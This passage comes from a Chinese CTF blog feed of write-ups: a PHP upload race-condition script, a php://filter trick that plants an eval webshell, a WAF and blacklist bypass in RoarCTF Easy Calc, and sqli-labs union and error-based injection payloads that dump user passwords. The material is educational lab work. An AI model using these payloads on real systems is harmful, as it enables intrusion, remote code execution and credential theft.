unlink函数用来删除文件，如果我们已经上传webshell，但是后面又有unlink，那么此时第一反应肯定是条件竞争。考虑到php是串行处理任务，那可以多线程执行创建-访问-删除的任务，进而挂马。下面是exp.py。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> requests<span class="token keyword">import</span> threading<span class="token keyword">class</span> <span class="token class-name">RaceCondition</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>url <span class="token operator">=</span> <span class="token string">"http://2021summer.inhann.top:50005/upload/shell0.php"</span>        self<span class="token punctuation">.</span>uploadUrl <span class="token operator">=</span> <span class="token string">"http://2021summer.inhann.top:50005/"</span>    <span class="token keyword">def</span> <span class="token function">_get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>         <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'try to call uploaded file...'</span><span class="token punctuation">)</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>self<span class="token punctuation">.</span>url<span class="token punctuation">)</span>        <span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]create file info.php success"</span><span class="token punctuation">)</span>            os<span class="token punctuation">.</span>_exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">_upload</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"upload file....."</span><span class="token punctuation">)</span>        <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"file"</span><span class="token punctuation">:</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"shell0.php"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>        requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>self<span class="token punctuation">.</span>uploadUrl<span class="token punctuation">,</span> files<span class="token operator">=</span><span class="token builtin">file</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>_get<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>_upload<span class="token punctuation">(</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>_get<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    threads <span class="token operator">=</span> <span class="token number">10</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>threads<span class="token punctuation">)</span><span class="token punctuation">:</span>        t <span class="token operator">=</span> RaceCondition<span class="token punctuation">(</span><span class="token punctuation">)</span>        t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>threads<span class="token punctuation">)</span><span class="token punctuation">:</span>        t<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>下面是shell0.php的源码：<br><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'info.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&lt;?php phpinfo();?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span></code></pre></p><h2 id="easy-shell"><a href="#easy-shell" class="headerlink" title="easy_shell"></a>easy_shell</h2><pre class="language-php" data-language="php"><code class="language-php">?src=1string(41) "uploads/16bebaa6795a6d29635ae505fab74742/"抱着试一试的心态:payload: ?src=1源码显露出来了。error_reporting(0);echo "?src=1";$dir='uploads/';if (!is_dir($dir)) &#123;    mkdir($dir,0755);&#125;$dir = "uploads/".md5($_SERVER['REMOTE_ADDR']).'/';var_dump($dir);if (!is_dir($dir)) &#123;    mkdir($dir,0755);&#125;$content = '<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">exit</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>';$content .= $_POST['txt'];$prefix=$_POST['prefix'];$name=$_POST['name'];if(strpos('./',$prefix) or strpos('./',$name))&#123;    die("?");&#125;$filename=$prefix.$dir.$name;file_put_contents($filename, $content);if (isset($_GET['src']))&#123;highlight_file(__FILE__);&#125;<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span>@<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>//flag is in /flag?></code></pre><p>发现存在file_put_contents函数。<br>由于base64编码中只包含64个可打印字符，在解码的时候，遇到这64个之外的字符，就会略过并且base64解码是四个byte一组，所以再增加一个字符，凑够两组，后面的就会正常解码<br>所以可以利用php://filter流的base64_decode函数特性去除exit。<br><pre class="language-php" data-language="php"><code class="language-php">payload<span class="token punctuation">:</span> url<span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token comment">//1.15.145.49:83/index.php?src=1</span><span class="token constant">POST</span><span class="token punctuation">:</span> prefix<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/write=convert.base64-decode/resource=&amp;name=shell.php&amp;txt=aPD9waHAgZXZhbChAJF9QT1NUWydhJ10pOyA/Pg==</span>之后使用蚁剑连接http<span class="token punctuation">:</span><span class="token comment">//1.15.145.49:83/uploads/16bebaa6795a6d29635ae505fab74742/shell.php</span>即可。</code></pre></p><h2 id="全新OJ上线辣"><a href="#全新OJ上线辣" class="headerlink" title="全新OJ上线辣"></a>全新OJ上线辣</h2><p>没做出来，把这题A了，orz<br>A的代码，用的筛法+二分，没有python模板，网上找的。<br><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">sieve_of_eratosthenes</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    primes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token boolean">True</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>    p <span class="token operator">=</span> <span class="token number">2</span>    <span class="token keyword">while</span> p <span class="token operator">*</span> p <span class="token operator">&lt;=</span> n<span class="token punctuation">:</span>        <span class="token keyword">if</span> primes<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>p <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">,</span> n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">:</span>                primes<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">False</span>        p <span class="token operator">+=</span> <span class="token number">1</span>    primes <span class="token operator">=</span> <span class="token punctuation">[</span>element <span class="token keyword">for</span> element <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token keyword">if</span> primes<span class="token punctuation">[</span>element<span class="token punctuation">]</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> primes<span class="token punctuation">;</span><span class="token keyword">def</span> <span class="token function">search</span><span class="token punctuation">(</span>nums<span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">,</span> target<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">:</span>    left<span class="token punctuation">,</span> right <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span>    <span class="token keyword">while</span> left <span class="token operator">&lt;=</span> right<span class="token punctuation">:</span>        pivot <span class="token operator">=</span> left <span class="token operator">+</span> <span class="token punctuation">(</span>right <span class="token operator">-</span> left<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>        <span class="token keyword">if</span> nums<span class="token punctuation">[</span>pivot<span class="token punctuation">]</span> <span class="token operator">==</span> target<span class="token punctuation">:</span>            <span class="token keyword">return</span> pivot        <span class="token keyword">if</span> target <span class="token operator">&lt;</span> nums<span class="token punctuation">[</span>pivot<span class="token punctuation">]</span><span class="token punctuation">:</span>            right <span class="token operator">=</span> pivot <span class="token operator">-</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            left <span class="token operator">=</span> pivot <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    x<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    x<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>    primes<span class="token operator">=</span>sieve_of_eratosthenes<span class="token punctuation">(</span>x<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>    n<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>primes<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>x<span class="token operator">%</span>primes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flag <span class="token operator">=</span> search<span class="token punctuation">(</span>primes<span class="token punctuation">,</span>x<span class="token operator">/</span>primes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>flag<span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>                exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></code></pre><br>CTF：TODO</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF WEB [RoarCTF 2019]Easy Calc</title>
      <link href="/2021/08/17/BUUCTF-WEB-RoarCTF-2019-Easy-Calc/"/>
      <url>/2021/08/17/BUUCTF-WEB-RoarCTF-2019-Easy-Calc/</url>
      
        <content type="html"><![CDATA[<h3 id="前置知识点"><a href="#前置知识点" class="headerlink" title="前置知识点"></a>前置知识点</h3><ol><li><p>php字符串解析特性<br> PHP会将查询字符串（在URL或正文中）转换为内部关联数组<code>$_GET</code>或关联数组<code>$_POST</code>,例如会将 <code>/?foo=bar变成Array([foo] =&gt; “bar”)</code>。</p><p> 然而查询字符串在解析的过程中会将某些字符删除或用下划线代替，如<code>/?%20news[id%00=42</code>会转换为<code>Array([news_id] =&gt; 42)</code>。</p><p> 如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：<code>/news.php?%20news[id%00=42&quot;+AND+1=0–</code>这句话的意思就是<code>$_GET[&quot;news_id&quot;]=42&quot;+AND+1=0-</code></p><p> |User_Input|Decode_PHP|variable name|<br> |-|-|-|<br> %20foo_bar%00|foo_bar|foo_bar|<br> foo%20bar%00|foo bar|foo bar|<br> foo%5bbar|foo[bar|foo_bar</p></li><li>使用chr()函数绕过匹配</li></ol><p>num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</p><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>打开题目，F12查看源代码<br><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!--I've set up WAF to ensure security.--></span>    $('#calc').submit(function()&#123;        $.ajax(&#123;            url:"calc.php?num="+encodeURIComponent($("#content").val()),            type:'GET',            success:function(data)&#123;                $("#result").html(`<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>alert alert-success<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>strong</span><span class="token punctuation">></span></span>答案:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>strong</span><span class="token punctuation">></span></span>$&#123;data&#125;            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>`);            &#125;,            error:function()&#123;                alert("这啥?算不来!");            &#125;        &#125;)        return false;    &#125;)</code></pre><br>发现有calc.php文件并且网页开启了WAF。<br>打开calc.php 文件，查看源代码<br><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\t'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\r'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\n'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\''</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'`'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\['</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\]'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\$'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\^'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$blackitem</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what are you want to do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'echo '</span><span class="token operator">.</span><span class="token variable">$str</span><span class="token operator">.</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><br>发现了过滤机制，虽然WAF防御了<code>num</code>变量，但是并没有防御<code>%20num</code>,于是可以使用空格绕过WAF，然后使用eval执行命令。使用<code>chr()</code>函数绕过黑名单，使用<code>var_dump(scandir(chr(47)))</code>查看数组，发现存在f1agg文件，构造<code>payload=num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</code>即找到flag。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Sqli-lab 刷题记录</title>
      <link href="/2021/08/15/Sqli-lab-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2021/08/15/Sqli-lab-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="Preparation："><a href="#Preparation：" class="headerlink" title="Preparation："></a>Preparation：</h2><p>为了不干扰本地搭建的环境，我的sql-lab是使用docker跑起来的。Win10 家庭版搭建起来比较繁琐，我使用的是 hyper-v + windows + docker for windows 跑的，命令比较简单，就只有两句话。<br><pre class="language-docker" data-language="docker"><code class="language-docker">docker pull acgpiano/sqli-labsdocker run -dt --name sqli-lab -p [你要映射的端口]:80 acgpiano/sqli-labs:latest</code></pre></p><h2 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h2><ol><li><p>列举一下sql的基础语句，学了好久了，感觉要忘光了orz。</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">show</span> <span class="token keyword">databases</span><span class="token punctuation">;</span>         <span class="token comment">//查看数据库</span><span class="token keyword">use</span> xxx<span class="token punctuation">;</span>                <span class="token comment">//使用某个数据库</span><span class="token keyword">show</span> <span class="token keyword">tables</span><span class="token punctuation">;</span>            <span class="token comment">//查看该数据库的数据表</span><span class="token keyword">desc</span> xxx<span class="token punctuation">;</span>               <span class="token comment">//查看该数据表的结构</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> xxx<span class="token punctuation">;</span>      <span class="token comment">//查找某个数据表的所有内容</span><span class="token keyword">select</span> schema_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>schemata<span class="token punctuation">;</span>        <span class="token comment">//猜数据库</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'xxxxx'</span><span class="token punctuation">;</span>                                <span class="token comment">//猜某数据库的数据表</span><span class="token keyword">Select</span> column_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'xxxxx'</span><span class="token punctuation">;</span>                                <span class="token comment">//猜某表的所有列</span><span class="token keyword">left</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>       <span class="token comment">//从左侧截取 a 的前 b 位</span><span class="token function">mid</span><span class="token punctuation">(</span>column_name<span class="token punctuation">,</span><span class="token keyword">start</span><span class="token punctuation">[</span><span class="token punctuation">,</span>length<span class="token punctuation">]</span><span class="token punctuation">)</span>     <span class="token comment">//从位置start开始，截取column_name字符串的length位，与substr作用相同</span>substr<span class="token punctuation">(</span>string<span class="token punctuation">,</span> <span class="token keyword">start</span><span class="token punctuation">,</span> length<span class="token punctuation">)</span>       <span class="token comment">//从位置start开始，截取字符串string的length长度，与mid作用相同</span>ascii<span class="token punctuation">(</span><span class="token punctuation">)</span>         <span class="token comment">//将某个字符转换成ascii码</span>ord<span class="token punctuation">(</span><span class="token punctuation">)</span>           <span class="token comment">//将某个字符转换成ascii码，同ascii()</span></code></pre></li><li><p>报错注入的原理<br>在mysql高版本（大于5.1版本）中添加了对XML文档进行查询和修改的函数：updatexml()和extractvalue()<br>当这两个函数在执行时，如果出现xml文档路径错误就会产生报错<br>利用select count(<em>),floor(rand(0)</em>2)x from information_schema.character_sets group by x;导致数据库报错，通过concat函数连接注入语句与floor(rand(0)*2)函数，实现将注入结果与报错信息回显的注入方式。</p></li></ol><h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><ol><li>查询代码:<pre class="language-sql" data-language="sql"><code class="language-sql">$<span class="token keyword">sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span><span class="token punctuation">;</span></code></pre></li><li>查询字段数量和回显点<pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>'<span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token punctuation">[</span>数字<span class="token punctuation">]</span><span class="token operator">%</span><span class="token number">23</span>这里最后查询到的字段数为<span class="token number">3</span>，回显点为<span class="token number">2</span>、<span class="token number">3</span>个字段</code></pre></li><li>查询数据库的版本和当前数据库<pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>结果：</code></pre></li><li><p>查询所有数据库的名字</p><pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>'<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span><span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>schemata<span class="token punctuation">)</span> <span class="token operator">%</span><span class="token number">23</span>结果:information_schema<span class="token punctuation">,</span>challenges<span class="token punctuation">,</span>mysql<span class="token punctuation">,</span>performance_schema<span class="token punctuation">,</span>security</code></pre></li><li><p>查询指定数据库的表的名字</p><pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">'union select 1,2,(select group_concat(table_name)from information_schema.tables where table_schema='</span>security'<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>结果：emails<span class="token punctuation">,</span>referers<span class="token punctuation">,</span>uagents<span class="token punctuation">,</span>users</code></pre></li><li>查询指定数据库、表的列名<pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">'union select 1,2,(select group_concat(column_name)from information_schema.columns where table_schema='</span>security<span class="token string">' and table_name='</span>users'<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>结果:id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password</code></pre></li><li>查询用户名和密码<pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">'union select 1,(select group_concat(username separator '</span><span class="token punctuation">;</span><span class="token string">')from users),(select group_concat(password separator '</span><span class="token punctuation">;</span>'<span class="token punctuation">)</span><span class="token keyword">from</span> users<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span></code></pre></li></ol><h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><p>该题和Less-1差不多解法，区别在于Less-1是字符型注入，该题是数字型注入，具体不详细赘述了。<br><pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token operator">%</span><span class="token number">23</span></code></pre></p><h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><p>该题和Less-1差不多解法，改变一下闭合方式。<br><pre class="language-sql" data-language="sql"><code class="language-sql">id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>'<span class="token punctuation">)</span><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token operator">%</span><span class="token number">23</span></code></pre></p><h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><p>该题和Less-1差不多解法，改变一下闭合方式。<br><pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>"<span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token operator">%</span><span class="token number">23</span></code></pre></p><h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><p>该题是使用报错注入的方法。<br><pre class="language-sql" data-language="sql"><code class="language-sql">数据库及相关信息:?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">'and updatexml(1,concat(0x7e,database(),0x7e,user(),0x7e,@@datadir),1)%23?id=1'</span><span class="token operator">and</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token number">23</span>数据库表名相关信息：?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">'and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23?id=1'</span><span class="token operator">and</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>数据库指定表的列名相关信息：?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">'and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_schema=database() and table_name='</span>users<span class="token string">'),0x7e),1)%23?id=1'</span><span class="token operator">and</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">and</span> table_name<span class="token operator">=</span><span class="token string">'users'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>数据库指定表指定列的字段：?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">'and updatexml(1,concat(0x7e,(select group_concat(password)from security.users),0x7e),1)%23?id=1'</span><span class="token operator">and</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token 